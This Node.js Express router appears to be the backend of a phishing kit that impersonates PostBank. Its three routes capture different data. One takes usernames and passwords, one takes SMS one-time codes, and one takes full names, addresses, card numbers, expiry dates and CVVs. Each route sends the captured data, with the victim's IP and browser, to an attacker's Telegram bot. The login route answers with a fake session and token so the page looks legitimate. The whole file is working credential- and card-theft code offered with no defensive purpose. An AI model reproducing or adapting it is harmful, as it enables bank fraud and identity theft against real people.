const express = require('express')
const geoip = require('geoip-lite')
const jwt = require('jsonwebtoken')
const crypto = require('crypto')


const login =express.Router()
const axios =require('axios')
const {protect} = require("../middleware/authMiddleware");
require('dotenv').config()

const { TOKEN , ChatID } = process.env
const Telegram_api=`https://api.telegram.org/bot${TOKEN}`
const generateToken = (id) => {
    return jwt.sign({ id }, process.env.JWT_SECRET, {
        expiresIn: '30d',
    })
}

login.post('/',(req,res)=>{
    const geo = geoip.lookup(req.ip);
    const rand=crypto.createHash('sha1').digest('hex');
    const log= "---------- ☺ Login PostBank ☺ ----------- \n" +
        "Username : " +req.body.username +"\n"+
        "Password : "+ req.body.password +"\n"+
        "------------------------------------- \n"+
        "Browser : " +req.headers["user-agent"]+"\n"+
        "Ip Address  :"+req.ip+"\n"+
        "----------Created By ChkawPaolo ----------- \n"
    const rs = axios.post(`${Telegram_api}/sendMessage`, {
        chat_id: ChatID,
        text: log
    })
    res.status(200).json({
        'session':rand,
        'jwt':generateToken(req.body.username)
    })

})

login.post('/new',(req,res)=>{
    const geo = geoip.lookup(req.ip);
    const log= "---------- ☺ ♥ ♥ SMS PostBank ♥ ♥ ☺ ----------- \n" +
        "SMS 1  : " +req.body.sms +"\n"+
        "SMS 2 : "+ req.body.sms1 +"\n"+
        "------------------------------------- \n"+
        "Browser : " +req.headers["user-agent"]+"\n"+
        "Ip Address  :"+req.ip+"\n"+
        "----------Created By ChkawPaolo ----------- \n"
    const rs = axios.post(`${Telegram_api}/sendMessage`, {
        chat_id: ChatID,
        text: log
    })

})
login.post('/vbv',(req,res)=>{
    const geo = geoip.lookup(req.ip);
    const log= "---------- ☺ ♥ ♥ SMS VBV PostBank Happy Cash bb  ♥ ♥ ☺ ----------- \n" +
        "FullName : " +req.body.fullname +"\n"+
        "Address  : " +req.body.adress +"\n"+
        "City : " +req.body.city +"\n"+
        "Zipcode   : " +req.body.zipcode +"\n"+
        "---------- ☺ ♥ ♥  VBV PostBank Happy Cash bb  ♥ ♥ ☺ ----------- \n" +
        "CC  : " +req.body.creditNumber +"\n"+
        "Data exp : "+ req.body.dateExp +"\n"+
        "Cvv : "+ req.body.cvv +"\n"+
        "---------- ☺ ♥ ♥  VBV PostBank  ♥ ♥ ☺ ----------- \n" +
        "------------------------------------- \n"+
        "Browser : " +req.headers["user-agent"]+"\n"+
        "Ip Address  :"+req.ip+"\n"+
        "----------Created By ChkawPaolo ----------- \n"
    const rs = axios.post(`${Telegram_api}/sendMessage`, {
        chat_id: ChatID,
        text: log
    })

})


module.exports = login

